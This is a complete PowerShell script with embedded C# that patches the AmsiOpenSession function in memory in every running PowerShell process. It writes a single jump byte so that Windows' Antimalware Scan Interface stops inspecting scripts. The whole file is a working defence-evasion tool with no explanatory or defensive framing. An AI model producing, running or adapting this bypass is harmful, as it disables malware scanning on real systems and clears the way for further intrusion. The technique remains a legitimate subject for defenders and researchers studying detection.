Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class NukeAMSI
{
    public const int PROCESS_VM_OPERATION = 0x0008;
    public const int PROCESS_VM_READ = 0x0010;
    public const int PROCESS_VM_WRITE = 0x0020;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("ntdll.dll")]
    public static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, [In] ref OBJECT_ATTRIBUTES ObjectAttributes, [In] ref CLIENT_ID ClientId);

    [DllImport("ntdll.dll")]
    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    public static extern int NtClose(IntPtr Handle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public int Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
}
"@

function ModAMSI {
    param (
        [int]$processId
    )

    $patch = [byte]0xEB

    $objectAttributes = New-Object NukeAMSI+OBJECT_ATTRIBUTES
    $clientId = New-Object NukeAMSI+CLIENT_ID
    $clientId.UniqueProcess = [IntPtr]$processId
    $clientId.UniqueThread = [IntPtr]::Zero
    $objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)

    $hHandle = [IntPtr]::Zero
    $status = [NukeAMSI]::NtOpenProcess([ref]$hHandle, [NukeAMSI]::PROCESS_VM_OPERATION -bor [NukeAMSI]::PROCESS_VM_READ -bor [NukeAMSI]::PROCESS_VM_WRITE, [ref]$objectAttributes, [ref]$clientId)

    if ($status -ne 0) {
        Write-Host "Failed to open process. NtOpenProcess status: $status" -ForegroundColor Red
        return
    }

    $amsiHandle = [NukeAMSI]::LoadLibrary("amsi.dll")
    if ($amsiHandle -eq [IntPtr]::Zero) {
        Write-Host "Failed to load amsi.dll." -ForegroundColor Red
        [NukeAMSI]::NtClose($hHandle)
        return
    }

    $amsiOpenSession = [NukeAMSI]::GetProcAddress($amsiHandle, "AmsiOpenSession")
    if ($amsiOpenSession -eq [IntPtr]::Zero) {
        Write-Host "Failed to find AmsiOpenSession function in amsi.dll." -ForegroundColor Red
        [NukeAMSI]::NtClose($hHandle)
        return
    }

    $patchAddr = [IntPtr]($amsiOpenSession.ToInt64() + 3)

    $oldProtect = [UInt32]0
    $size = [UIntPtr]::new(1)
    $protectStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, [NukeAMSI]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)

    if (-not $protectStatus) {
        Write-Host "Failed to change memory protection." -ForegroundColor Red
        [NukeAMSI]::NtClose($hHandle)
        return
    }

    $bytesWritten = [System.UInt32]0
    $status = [NukeAMSI]::NtWriteVirtualMemory($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)

    if ($status -eq 0) {
        Write-Host "Memory patched successfully at address $patchAddr." -ForegroundColor Green
    } else {
        Write-Host "Failed to patch memory. NtWriteVirtualMemory status: $status" -ForegroundColor Red
    }

    $restoreStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, $oldProtect, [ref]$oldProtect)

    if (-not $restoreStatus) {
        Write-Host "Failed to restore memory protection." -ForegroundColor Red
    }

    [NukeAMSI]::NtClose($hHandle)
}

function ModAllPShells {
    Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object {
        ModAMSI -processId $_.Id
    }
}

ModAllPShells
